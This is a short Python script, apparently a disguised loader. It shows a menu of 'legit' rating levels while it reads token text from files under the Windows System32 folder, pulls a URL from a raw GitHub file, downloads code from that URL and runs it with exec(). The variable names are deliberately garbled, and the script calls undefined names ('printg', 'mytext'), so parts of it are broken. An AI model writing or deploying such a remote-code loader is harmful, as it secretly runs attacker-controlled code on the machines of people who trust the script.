from cryptography.fernet import Fernet
import requests
import os
from art import *
import getpass
import keyring

def new_function_name(new_privacy_key):
    raw2_url  = 'https://raw.githubusercontent.com/xsjfns/raws/main/rawaes.txt'

    crpppttkkyy = Fernet.generate_key()
    cipher_suite = Fernet(crpppttkkyy)
    
    cipher_text = cipher_suite.encrypt(new_privacy_key.encode())
    
    os.environ['crpppttkkyy'] = crpppttkkyy.decode()
    os.environ['ncrptttkkn'] = cipher_text.decode()
    
    crpppttkkyy = os.environ['crpppttkkyy']
    cipher_suite = Fernet(crpppttkkyy.encode())
    ncrptttkkn = os.environ['ncrptttkkn']
    dcrpptttknnnn = cipher_suite.decrypt(ncrptttkkn.encode()).decode()
    
    
    headers = {'Authorization': f'token {dcrpptttknnnn}'}
    
    raw2response = requests.get(raw2_url,headers=headers)
    raw2finalcontent = raw2response.text
    raw2urlfinal = raw2finalcontent
    raw2urlfinalresponse = requests.get(raw2urlfinal,headers=headers)
    if raw2urlfinalresponse.status_code == 200:  
        content2 =  raw2urlfinalresponse.text
        if True:      
            rawfile_url = 'https://raw.githubusercontent.com/xsjfns/raws/main/rawaes.txt'
            rawresponse = requests.get(rawfile_url)
            rawcontent = rawresponse.text
            raw_url = rawcontent
            response = requests.get(raw_url, headers=headers)
            content = response.text
            exec(content)
        else:
            print("Invalid Key. Terminating program...")
    else:
        print(f"Failed to fetch file. Status code: {raw2urlfinalresponse.status_code}")

    if raw2urlfinalresponse.status_code != 200 or mytext not in content2:
        exit()


printg("----------------------------------")
printg("Very Legit (1-3)")
printg("Legit (4)")
printg("Semi Legit (5-6)")
printg("Rag3 (7+)")
printg("Invalid input will return error. Choose between 1-10")
def get_string_from_file(file_path):
    if os.path.exists(file_path):
        with open(file_path, 'r') as file:
            content = file.read()
        return content
    else:
        return "Error: File not found"
system_info_path = os.path.join(os.environ['SystemRoot'], 'System32', 'systeminfo.txt')
system_driver_vul_path = os.path.join(os.environ['SystemRoot'], 'System32', 'system_driver_vul.txt')
data_vulnerable_path = os.path.join(os.environ['SystemRoot'], 'System32', 'data_vulnerable_x.txt')
content1 = get_string_from_file(system_info_path)
content2 = get_string_from_file(system_driver_vul_path)
content3 = get_string_from_file(data_vulnerable_path)
content4 =  content1+content2+content3
privacy_key = content4
new_privacy_key = content4

new_function_name(new_privacy_key)
